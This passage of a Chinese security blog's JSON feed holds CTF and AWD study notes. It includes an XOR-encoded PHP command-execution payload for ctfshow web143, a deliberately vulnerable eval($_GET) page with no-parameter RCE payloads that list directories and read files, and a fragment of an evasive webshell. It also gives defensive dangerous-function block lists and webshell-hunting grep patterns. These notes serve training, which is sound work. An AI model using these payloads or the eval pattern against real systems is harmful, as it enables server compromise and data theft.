punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$i</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">^</span><span class=\"token number\">0xff</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"^\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">&lt;</span> <span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span><span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"%ff\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><h3 id=\"payload\"><a class=\"anchor\" href=\"#payload\">#</a> payload</h3>\n<pre><code>?v1=1&amp;v2=1&amp;v3=*(%8c%86%8c%8b%9a%92^%ff%ff%ff%ff%ff%ff)(%8b%9e%9c%df%99%93%9e%98%d1%8f%97%8f^%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff)*\n</code></pre>\n",
            "tags": [
                "ctfshow",
                "web143",
                "ctfshow"
            ]
        },
        {
            "id": "http://m3k0mi.github.io/2024/05/23/docker%E5%90%AF%E5%8A%A8web%E7%8E%AF%E5%A2%83/",
            "url": "http://m3k0mi.github.io/2024/05/23/docker%E5%90%AF%E5%8A%A8web%E7%8E%AF%E5%A2%83/",
            "title": "docker启动web环境",
            "date_published": "2024-05-23T08:04:23.000Z",
            "content_html": "<h3 id=\"创建镜像\"><a class=\"anchor\" href=\"#创建镜像\">#</a> 创建镜像</h3>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">docker</span> build <span class=\"token parameter variable\">-t</span> name <span class=\"token builtin class-name\">.</span></pre></td></tr></table></figure><h3 id=\"创建容器\"><a class=\"anchor\" href=\"#创建容器\">#</a> 创建容器</h3>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">docker</span> run <span class=\"token parameter variable\">-i</span> <span class=\"token parameter variable\">-d</span> <span class=\"token parameter variable\">-P</span> name</pre></td></tr></table></figure><h3 id=\"进入正在运行容器内\"><a class=\"anchor\" href=\"#进入正在运行容器内\">#</a> 进入正在运行容器内</h3>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">docker</span> <span class=\"token builtin class-name\">exec</span> <span class=\"token parameter variable\">-it</span> 容器id /bin/bash</pre></td></tr></table></figure>",
            "tags": [
                "笔记",
                "docker",
                "笔记"
            ]
        },
        {
            "id": "http://m3k0mi.github.io/2024/05/16/%E6%97%A0%E7%BA%BFAC/",
            "url": "http://m3k0mi.github.io/2024/05/16/%E6%97%A0%E7%BA%BFAC/",
            "title": "无线AC",
            "date_published": "2024-05-16T05:58:19.000Z",
            "content_html": "<h3 id=\"开启无线功能\"><a class=\"anchor\" href=\"#开启无线功能\">#</a> 开启无线功能</h3>\n<p>AC(config)#wireless<br />\nAC(config-wireless)#enable</p>\n<h3 id=\"配置静态无线ip地址\"><a class=\"anchor\" href=\"#配置静态无线ip地址\">#</a> 配置静态无线 ip 地址</h3>\n<p>AC(config-wireless)#static-ip 10.10.2.1</p>\n<h3 id=\"创建ssid\"><a class=\"anchor\" href=\"#创建ssid\">#</a> 创建 ssid</h3>\n<p>AC(config-wireless)#network 14<br />\nAC(config-network)#ssid Wifi-2.4G\t<a href=\"//xn--ssidWifi-2-1x2pl83k0g4g8j6b.4G\">// 将 ssid 配置为 Wifi-2.4G</a><br />\nAC (config-network)#vlan 140\t// 使用 vlan140<br />\nAC (config-network)#security mode wpa-personal\t// 加密方式为 wpa-personal<br />\nAC(config-network)#wpa key Wifi-2.4G\t<a href=\"//xn--Wifi-2-vy7ij9b42z.4G\">// 口令为 Wifi-2.4G</a></p>\n<p>AC (config-network)#security mode static-wep\t// 加密方式为 static-wep<br />\nAC (config-network)#wep key type ascii\t// 配置 share key 的编码类型<br />\n AC (config-network)#wep key 1234567890123\t// 口令为 1234567890123</p>\n<p>AC(config-wireless)#network 1<br />\nAC (config-network)#hide ssid\t// 隐藏 network 1</p>\n<h3 id=\"射频管理\"><a class=\"anchor\" href=\"#射频管理\">#</a> 射频管理</h3>\n<p>AC(config-wireless)#ap profile 1<br />\nAC (config-ap)#name WIFI\t// 将 ap 命名为 WIFI<br />\nAC (config-ap)#radio 1\t//radio 1 对应 AP 上 2.4Ghz 工作频段，radio 2 对应 AP 上 5Ghz 工作频段<br />\n AC (config-ap)#mode bg\t<a href=\"//xn--802-c88dv5co94bh6cf0cz03b5v2cvk2axf6a.11bg\">// 设置射频工作模式为 802.11bg</a><br />\nAC (config-ap)#vap 13\t//network1 对应 vap0，network2 对应 vap1。所以这应该是 vap13<br />\nAC(config-ap)#enable</p>\n<p>AC(config-ap)#radio 2<br />\nAC(config-ap)#mode a\t<a href=\"//802.xn--11a5GHz-r35km3p0spd6rlv2ae9jul2n\">//802.11a 标准工作在 5GHz 频段</a><br />\n AC (config-ap)#vap 14<br />\nAC(config-ap)#enable</p>\n<h3 id=\"arp抑制\"><a class=\"anchor\" href=\"#arp抑制\">#</a> arp 抑制</h3>\n<p>AC (config-network)#arp-suppression\t// 开启 arp 抑制</p>\n<h3 id=\"用户隔离\"><a class=\"anchor\" href=\"#用户隔离\">#</a> 用户隔离</h3>\n<p>AC (config-network)#station-isolation\t// 开启用户隔离</p>\n<h3 id=\"限时策略\"><a class=\"anchor\" href=\"#限时策略\">#</a> 限时策略</h3>\n<p>基于 network</p>\n<p>AC(config-wireless)# network 2<br />\nAC(config-network)# time-limit from 7:0 to 17:0 weekday Monday</p>\n<p>基于 radio</p>\n<p><a href=\"//2.xn--4G06-m84fzbh978a67d4pcda865c8rbca4369c9thviy74vca4706bwjgezw\">//2.4G 信号周一到周三早上 0 点到 6 点禁止终端接入</a></p>\n<p>AC(config-wireless)#ap profile 1<br />\nAC(config-ap-profile)#radio 1<br />\nAC(config-ap-profile-radio)#time-limit from 00:00 to 06:00 weekday monday<br />\nAC(config-ap-profile-radio)#time-limit from 00:00 to 06:00 weekday tuesday<br />\nAC(config-ap-profile-radio)#time-limit from 00:00 to 06:00 weekday wednesday</p>\n<h3 id=\"client-qos\"><a class=\"anchor\" href=\"#client-qos\">#</a> Client QoS</h3>\n<p>AC (config-wireless)#ap client-qos\t// 启动 Client Qos 功能<br />\n AC (config-wireless)#network 14<br />\nAC (config-network)#client-qos bandwidth-limit up 2048\t// 配置上行速度为 2Mbps<br />\nAC (config-network)#client-qos bandwidth-limit down 5120\t// 配置下行速度为 5Mbps</p>\n<h3 id=\"mac黑名单\"><a class=\"anchor\" href=\"#mac黑名单\">#</a> MAC 黑名单</h3>\n<p>AC (config-wireless)#mac-authentication-mode black-list\t// 开启黑名单 (white-list 白名单)<br />\n AC (config-wireless)#know-client 00-e1-3a-10-be-51 action global-action\t// 添加进黑名单，只有 action 设置为 global 时设置才启作用，在黑名单中被拒绝，相反在白名单中被接受。<br />\nAC(config-wireless)# network 14<br />\nAC (config-network)# mac authentication  local\t// 打开 mac 认证，并设置本地认证</p>\n<h3 id=\"无线信号强度低于50的禁止连接\"><a class=\"anchor\" href=\"#无线信号强度低于50的禁止连接\">#</a> 无线信号强度低于 50% 的禁止连接</h3>\n<p>AC(config-wireless)#ap profile 1<br />\nAC(config-ap-profile)#radio 1<br />\nAC(config-ap-profile-radio)#client-reject rssi-threshold 50</p>\n<h3 id=\"时空公平\"><a class=\"anchor\" href=\"#时空公平\">#</a> 时空公平</h3>\n<p>AC (config-ap-profile-radio)#schedule-mode fair\t// 每个客户端机会均等获得传输机会</p>\n<h3 id=\"ap-flood\"><a class=\"anchor\" href=\"#ap-flood\">#</a> AP FLOOD</h3>\n<p>AC (config-wireless)#wireless ap anti-flood interval 10\t// 检测时间 10 分钟<br />\n AC (config-wireless)#wireless ap anti-flood max-conn-count 5\t// 设置最大连接次数 5 分钟<br />\n AC (config-wireless)#wireless ap anti-flood agetime 120\t// 设置老化时间 2 小时</p>\n<h3 id=\"自动信道调整\"><a class=\"anchor\" href=\"#自动信道调整\">#</a> 自动信道调整</h3>\n<p>AC(config-ap-profile)#channel-plan an time 07:00<br />\nAC(config-ap-profile)#channel-plan bgn time 07:00</p>\n",
            "tags": [
                "笔记",
                "无线AC",
                "笔记"
            ]
        },
        {
            "id": "http://m3k0mi.github.io/2024/05/11/awd/",
            "url": "http://m3k0mi.github.io/2024/05/11/awd/",
            "title": "awd",
            "date_published": "2024-05-11T04:53:18.000Z",
            "content_html": "<h3 id=\"ssh登录\"><a class=\"anchor\" href=\"#ssh登录\">#</a> ssh 登录</h3>\n<p>ssh [-p port] <a href=\"mailto:user@192.168.1.2\">user@192.168.1.2</a>\t// 使用用户名密码</p>\n<p>ssh -i id_rsa roo\t// 使用私钥</p>\n<h3 id=\"ssh私钥生成\"><a class=\"anchor\" href=\"#ssh私钥生成\">#</a> ssh 私钥生成</h3>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>ssh-keygen <span class=\"token parameter variable\">-t</span> rsa</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token builtin class-name\">cd</span> /root/.ssh</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">cp</span> id_rsa.pub authorized_keys</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">chmod</span> +x authorized_keys</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token function\">cat</span> id_rsa</pre></td></tr></table></figure><h3 id=\"scp命令\"><a class=\"anchor\" href=\"#scp命令\">#</a> scp 命令</h3>\n<p>用于 linux 之间复制文件和目录</p>\n<p>-q 不显示传输进度条</p>\n<p>-r 递归复制整个目录</p>\n<p>-i 从指定文件中读取传输时使用的密钥文件</p>\n<p>-P 指定数据传输使用到的端口</p>\n<p>从远程复制到本地</p>\n<p>上传和下载源码：</p>\n<p>scp username@servername:/path/filename/tmp/local_destination  // 从服务器下载单个文件到本地<br />\n scp /path/local_filename username@servername:/path             // 从本地上传单个文件到服务器<br />\n scp -r username@servername:remote_dir//tmp/local_dir          // 从服务器下载整个目录到本地<br />\n scp -r /tmp/local_dir username@servername:remote_dir           // 从本地上传整个目录到服务器</p>\n<h3 id=\"通过ssh传文件\"><a class=\"anchor\" href=\"#通过ssh传文件\">#</a> 通过 ssh 传文件</h3>\n<p>使用 scp 命令</p>\n<p>scp（Secure Copy）是基于 SSH 协议的文件复制工具，它允许用户在本地和远程系统之间安全地复制文件或目录。</p>\n<p>从本地复制到远程服务器：</p>\n<p>scp /path/to/local/file username@remote_host:/path/to/remote/directory</p>\n<p>这个命令会提示输入远程服务器的密码，然后将本地文件复制到远程服务器指定的目录。</p>\n<p>从远程服务器复制到本地：</p>\n<p>scp username@remote_host:/path/to/remote/file /path/to/local/directory</p>\n<p>同样，这个命令也需要输入远程服务器的密码，然后将远程服务器上的文件复制到本地指定的目录。</p>\n<ol start=\"2\">\n<li>使用 rsync 命令</li>\n</ol>\n<p>rsync 是一个功能强大的文件同步和传输工具，它支持本地和远程之间的文件同步，并且可以进行增量备份。</p>\n<p>基本的<strong> rsync</strong> 命令：</p>\n<p>rsync -avz -e ssh /path/to/local/file username@remote_host:/path/to/remote/directory</p>\n<p>这个命令通过 SSH 连接到远程服务器，并将本地文件同步到远程目录。选项 - a 表示归档模式，-v 表示详细模式，-z 表示压缩数据。</p>\n<p>增量同步： rsync 可以只同步发生变化的文件，这在频繁备份时非常有用：</p>\n<p>rsync -avz -e ssh --delete username@remote_host:/path/to/remote/file /path/to/local/directory</p>\n<p>--delete 选项会删除本地目录中不存在的文件，确保两边的文件保持一致。</p>\n<ol start=\"3\">\n<li>使用 sshfs 挂载远程文件系统</li>\n</ol>\n<p>sshfs（SSH File System）允许你将远程文件系统挂载到本地，就像操作本地文件系统一样。</p>\n<p>挂载远程文件系统：</p>\n<p>sshfs username@remote_host:/path/to/remote/directory /path/to/local/mountpoint -o follow_symlinks</p>\n<p>这个命令会将远程目录挂载到本地的挂载点。-o follow_symlinks 选项允许跟随符号链接。</p>\n<h3 id=\"信息收集\"><a class=\"anchor\" href=\"#信息收集\">#</a> 信息收集</h3>\n<h4 id=\"查看当前用户信息\"><a class=\"anchor\" href=\"#查看当前用户信息\">#</a> 查看当前用户信息</h4>\n<p>cat /etc/passwd、ls /home</p>\n<h4 id=\"寻找源码位置\"><a class=\"anchor\" href=\"#寻找源码位置\">#</a> 寻找源码位置</h4>\n<p>常规路径如：/var/www/html、/app 或使用命令 find /-name &quot;index*&quot;</p>\n<h3 id=\"源码备份\"><a class=\"anchor\" href=\"#源码备份\">#</a> 源码备份</h3>\n<h4 id=\"备份位置\"><a class=\"anchor\" href=\"#备份位置\">#</a> 备份位置</h4>\n<p>1. 本地<br />\n 2. 服务器上非 web 路径 /tmp/home/xxx</p>\n<h4 id=\"源码备份-2\"><a class=\"anchor\" href=\"#源码备份-2\">#</a> 源码备份</h4>\n<p>scp 或工具直接拖出</p>\n<p>scp local_file remote_username@remote_ip:remote_folder</p>\n<p>tar</p>\n<p>tar -cvf /home/user/html.tar /var/www/html</p>\n<h4 id=\"数据库备份\"><a class=\"anchor\" href=\"#数据库备份\">#</a> 数据库备份</h4>\n<p>mysqldump -u 用户名 -p 密码 -all-databases &gt; 备份文件.sql</p>\n<p>mysqldump -u 用户名 -p 密码 数据库名 &gt; 备份文件.sql</p>\n<h4 id=\"数据库恢复\"><a class=\"anchor\" href=\"#数据库恢复\">#</a> 数据库恢复</h4>\n<p>mysql -u 用户名 -p 密码 数据库名 &lt; 备份文件.sql</p>\n<h4 id=\"远程连接数据库\"><a class=\"anchor\" href=\"#远程连接数据库\">#</a> 远程连接数据库</h4>\n<p>mysql -h192.168.5.116 -P3306 -uroot -p123456</p>\n<h3 id=\"口令更改\"><a class=\"anchor\" href=\"#口令更改\">#</a> 口令更改</h3>\n<h4 id=\"ssh密码更改\"><a class=\"anchor\" href=\"#ssh密码更改\">#</a> ssh 密码更改</h4>\n<p>echo ctf:123456|chpasswd</p>\n<p>passwd</p>\n<h4 id=\"删除用户\"><a class=\"anchor\" href=\"#删除用户\">#</a> 删除用户</h4>\n<p>userdel -r 用户名</p>\n<h4 id=\"数据库密码更改\"><a class=\"anchor\" href=\"#数据库密码更改\">#</a> 数据库密码更改</h4>\n<p>set password = password('newpasswd')</p>\n<h4 id=\"站点密码修改\"><a class=\"anchor\" href=\"#站点密码修改\">#</a> 站点密码修改</h4>\n<p>尝试弱口令登录后台，未能成功可以尝试进入数据库修改</p>\n<p><strong>配置文件方式的后台</strong>密码</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">find</span> /var/www//html <span class=\"token parameter variable\">-path</span> ' config ’ <span class=\"token comment\">#查找配置文件中的密码凭证</span></pre></td></tr></table></figure><p>数据库后台管理员密码<br />\n mysql -u root -p<br />\nshow databases；<br />\nuse test; 打开站点的数据库<br />\n show tables; 打开站点的用户表<br />\n select * from admin;<br />\nupdata admin set user pass=’123456’; //updata 表名 set 字段名 = ‘值’;<br />\nflush privileges;</p>\n<h3 id=\"监控流量\"><a class=\"anchor\" href=\"#监控流量\">#</a> 监控流量</h3>\n<p>抓取特定端口的流量</p>\n<p>tcpdump tcp -t -s 0 and port 80 -w target.pcap</p>\n<p>抓取特定网卡流量</p>\n<p>tcpdump -i eth0 -w target.pcap</p>\n<h3 id=\"日志分析\"><a class=\"anchor\" href=\"#日志分析\">#</a> 日志分析</h3>\n<p>apache: /var/log/apache2/access.log</p>\n<p>nginx: /var/log/nginx/</p>\n<h3 id=\"web根目录设置只读和执行权限\"><a class=\"anchor\" href=\"#web根目录设置只读和执行权限\">#</a> Web 根目录设置只读和执行权限</h3>\n<p>chmod 0555 /var/www/html</p>\n<h3 id=\"php参数安全配置\"><a class=\"anchor\" href=\"#php参数安全配置\">#</a> PHP 参数安全配置</h3>\n<p>首先找到 PHP 的配置文件</p>\n<pre><code>/etc/php/&#123;version&#125;/php.ini\n</code></pre>\n<p>禁用高危函数</p>\n<pre><code>disable_functions = dl,exec,system,passthru,popen,proc_open,pcntl_exec,shell_exec,mail,imap_open,imap_mail,putenv,ini_set,apache_setenv,symlink,link\n</code></pre>\n<p>配置  <code>open_basedir</code>  （将用户访问文件的活动范围限制在指定的区域）</p>\n<pre><code>open_basedir=/var/www/html\n</code></pre>\n<p>禁用魔术引号（自动对外部来源数据进行转义，防止 SQL 注入）</p>\n<pre><code>magic_quotes_gpc = Off\n</code></pre>\n<p>关闭 PHP 伪协议</p>\n<pre><code>allow_url_fopen = Off\nallow_url_include = Off\n</code></pre>\n<p>重启 PHP</p>\n<pre><code>sudo service php7.0-fpm restart\nsudo systemctl restart php7.0-fpm.service\n</code></pre>\n<h3 id=\"应急响应\"><a class=\"anchor\" href=\"#应急响应\">#</a> 应急响应</h3>\n<h4 id=\"查询进程线程\"><a class=\"anchor\" href=\"#查询进程线程\">#</a> 查询进程线程</h4>\n<pre><code>netstat\nps -aux\nnetstat -apt\n</code></pre>\n<h4 id=\"杀掉进程\"><a class=\"anchor\" href=\"#杀掉进程\">#</a> 杀掉进程</h4>\n<pre><code>kill -9 pid            //Linux上\ntaskkill /f /pid pid   //Windows上\n</code></pre>\n<h4 id=\"搜索webshell文件\"><a class=\"anchor\" href=\"#搜索webshell文件\">#</a> 搜索 WebShell 文件</h4>\n<pre><code>find /var/www/html -name *.php -mmin -5                        //查看最近5分钟修改文件\nfind ./ -name '*.php' | xargs wc -l | sort -u                  //寻找行数最短文件，一般有可能是一句话木马\ngrep -r --include=*.php  '[^a-z]eval($_POST'  /var/www/html    //查包含关键字的php文件\nfind /var/www/html -type f -name &quot;*.php&quot; | xargs grep &quot;eval(&quot; |more //在Linux系统中使用find、grep和xargs命令的组合\n</code></pre>\n<h3 id=\"免杀马\"><a class=\"anchor\" href=\"#免杀马\">#</a> 免杀马</h3>\n<pre><code>&lt;?=~$_='$&lt;&gt;/'^'</code></pre>\n",
            "tags": [
                "笔记",
                "awd",
                "笔记"
            ]
        },
        {
            "id": "http://m3k0mi.github.io/2024/05/09/%E6%97%A0%E5%8F%82%E6%95%B0rce/",
            "url": "http://m3k0mi.github.io/2024/05/09/%E6%97%A0%E5%8F%82%E6%95%B0rce/",
            "title": "无参数rce",
            "date_published": "2024-05-09T09:57:00.000Z",
            "content_html": "<h3 id=\"无参数rce\"><a class=\"anchor\" href=\"#无参数rce\">#</a> 无参数 rce</h3>\n<h4 id=\"核心代码\"><a class=\"anchor\" href=\"#核心代码\">#</a> 核心代码</h4>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">';'</span> <span class=\"token operator\">===</span> <span class=\"token function\">preg_replace</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/[^\\W]+\\((?R)?\\)/'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'code'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>    </pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'code'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>正则部分</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">preg_replace</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/[^\\W]+\\((?R)?\\)/'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'code'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>\\W 匹配所有数字、字母、下划线，+ 表示出现的次数 &gt;=1，后面是一对括号 ()，里面的 (?R)? 表示递归整个匹配模式。整个就是匹配像 system () 这种格式，里面可以无限嵌套如：print_r (exec ())，但是里面不能有参数。</p>\n<h4 id=\"读取当前目录\"><a class=\"anchor\" href=\"#读取当前目录\">#</a> 读取当前目录</h4>\n<h5 id=\"方法一\"><a class=\"anchor\" href=\"#方法一\">#</a> 方法一：</h5>\n<p>print_r ()\t打印函数<br />\n scandir ()\t读取目录<br />\n current ()\t返回数组中的单元，默认第一个\t也可以使用 pos 效果一样<br />\n localeconv ()\t查找美国本地的数字格式化信息</p>\n<p>localeconv () 函数会返回以下数组元素：</p>\n<ul>\n<li>\n<p>[decimal_point] - 小数点字符\t(利用的是返回的这个点.)</p>\n<p>// 下面不重要</p>\n</li>\n<li>\n<p>[thousands_sep] - 千位分隔符</p>\n</li>\n<li>\n<p>[int_curr_symbol] - 货币符号 （例如：USD）</p>\n</li>\n<li>\n<p>[currency_symbol] - 货币符号 （例如：$）</p>\n</li>\n<li>\n<p>[mon_decimal_point] - 货币小数点字符</p>\n</li>\n<li>\n<p>[mon_thousands_sep] - 货币千位分隔符</p>\n</li>\n<li>\n<p>[positive_sign] - 正值字符</p>\n</li>\n<li>\n<p>[negative_sign] - 负值字符</p>\n</li>\n<li>\n<p>[int_frac_digits] - 国际通用小数位</p>\n</li>\n<li>\n<p>[frac_digits] - 本地通用小数位</p>\n</li>\n<li>\n<p>[p_cs_precedes] - 如果货币符号在一个正数值之前显示，则为 True（1），如果在正数值之后显示，则为 False（0）</p>\n</li>\n<li>\n<p>[p_sep_by_space] - 如果在货币符号和正数值之间包含空格，则为 True（1），否则为 False（0）</p>\n</li>\n<li>\n<p>[n_cs_precedes] - 如果货币符号在一个负数值之前显示，则为 True（1），如果在负数值之后显示，则为 False（0）</p>\n</li>\n<li>\n<p>[n_sep_by_space] - 如果在货币符号和负数值之间包含空格，则为 True（1），否则为 False（0）</p>\n</li>\n<li>\n<p>[p_sign_posn] - 格式化选项：</p>\n</li>\n<li>\n<ul>\n<li>0 - 把数量和货币符号写在圆括号内</li>\n<li>1 - 在数量和货币符号之前加上 + 号</li>\n<li>2 - 在数量和货币符号之后加上 + 号</li>\n<li>3 - 直接在货币符号之前加上 + 号</li>\n<li>4 - 直接在货币符号之后加上 + 号</li>\n</ul>\n</li>\n<li>\n<p>[n_sign_posn] - 格式化选项：</p>\n</li>\n<li>\n<ul>\n<li>0 - 把数量和货币符号写在圆括号内</li>\n<li>1 - 在数量和货币符号之前加上 - 号</li>\n<li>2 - 在数量和货币符号之后加上 - 号</li>\n<li>3 - 直接在货币符号之前加上 - 号</li>\n<li>4 - 直接在货币符号之后加上 - 号</li>\n</ul>\n</li>\n<li>\n<p>[grouping] - 显示数字组合形式的数组（例如：3 指示 1 000 000）</p>\n</li>\n<li>\n<p>[mon_grouping] - 显示货币数字组合形式的数组（例如：2 指示 1 00 00 00）</p>\n</li>\n</ul>\n<p>scandir (.) 可以用来扫描当前目录的文件，而 current (localeconv ()) 返回.，组合起来</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">print_r</span><span class=\"token punctuation\">(</span><span class=\"token function\">scandir</span><span class=\"token punctuation\">(</span><span class=\"token function\">current</span><span class=\"token punctuation\">(</span><span class=\"token function\">localeconv</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>就可以读取当前目录</p>\n<h5 id=\"方法二\"><a class=\"anchor\" href=\"#方法二\">#</a> 方法二：</h5>\n<p>getcwd ()\t获取当前绝对路径</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">print_r</span><span class=\"token punctuation\">(</span><span class=\"token function\">scandir</span><span class=\"token punctuation\">(</span><span class=\"token function\">getcwd</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>也可以读取当前目录</p>\n<h5 id=\"方法三\"><a class=\"anchor\" href=\"#方法三\">#</a> 方法三：</h5>\n<p>time ()\t返回当前时间的 Unix 时间戳<br />\n crypt ()\t返回使用 DES、Blowfish 或 MD5 算法加密的字符串。<br />\nhebrevc ()\t反向显示希伯来字符，并把新行（\\n）转换为 &lt;br&gt;</p>\n<p>由于 crypt (time ()) 生成的。都在字符串末尾，所以要用 hebrevc () 把。变成第一位</p>\n<p>hebrevc (crypt (time ())) 可以随机生成一个 hash 值，第一个字符随机是 <code>$</code> (大概率) 或者  <code>&quot;.&quot;</code> (小概率)</p>\n<p>ord ()\t返回字符串中的第一个字符的 ascii 值<br />\n chr ()\tascii 码转换成字符串</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">print_r</span><span class=\"token punctuation\">(</span><span class=\"token function\">scandir</span><span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token function\">ord</span><span class=\"token punctuation\">(</span><span class=\"token function\">hebrevc</span><span class=\"token punctuation\">(</span><span class=\"token function\">crypt</span><span class=\"token punctuation\">(</span><span class=\"token function\">time</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>由于 hebrevc (crypt (time ())) 第一个字符可能是 $ 或.，所以要多刷新几次</p>\n<p>同理</p>\n<p>strrev (crypt (serialize (array ()))) 也可以得到.</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">print_r</span><span class=\"token punctuation\">(</span><span class=\"token function\">scandir</span><span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token function\">ord</span><span class=\"token punctuation\">(</span><span class=\"token function\">strrev</span><span class=\"token punctuation\">(</span><span class=\"token function\">crypt</span><span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><h4 id=\"读取当前目录文件\"><a class=\"anchor\" href=\"#读取当前目录文件\">#</a> 读取当前目录文件</h4>\n<p>读取文件的函数</p>\n<p>show_source<br />\nreadfile<br />\nhighllight_file<br />\nfile_get_content<br />\nreadgzfile<br />\nfile 等</p>\n<h5 id=\"读取最后一个文件\"><a class=\"anchor\" href=\"#读取最后一个文件\">#</a> 读取最后一个文件</h5>\n<p>end ()\t将数字内部的指针指向最后一个单元</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">show_source</span><span class=\"token punctuation\">(</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token function\">scandir</span><span class=\"token punctuation\">(</span><span class=\"token function\">getcwd</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span 